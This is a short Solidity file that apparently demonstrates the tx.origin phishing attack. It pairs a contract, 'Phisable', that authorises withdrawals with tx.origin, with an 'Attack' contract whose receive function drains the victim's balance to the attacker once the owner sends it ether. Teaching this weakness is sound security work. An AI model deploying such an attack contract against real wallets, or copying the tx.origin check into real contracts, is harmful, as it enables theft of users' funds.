//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

// tx.origin attack

contract Attack {
    Phisable phisableContract;
    address payable attacker;

    constructor(Phisable phisableAddress, address payable attackerAddr) {
        // contract address of phisable contract
        phisableContract = phisableAddress;
        // externally owned account of attacker
        attacker = attackerAddr;
    }

    receive() external payable {
        phisableContract.withdrawAll(attacker);
    }
}

contract Phisable {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function sendEther() public payable {}

    function withdrawAll(address payable _recipient) public {
        require(tx.origin == owner);
        _recipient.transfer(address(this).balance);
    }
}
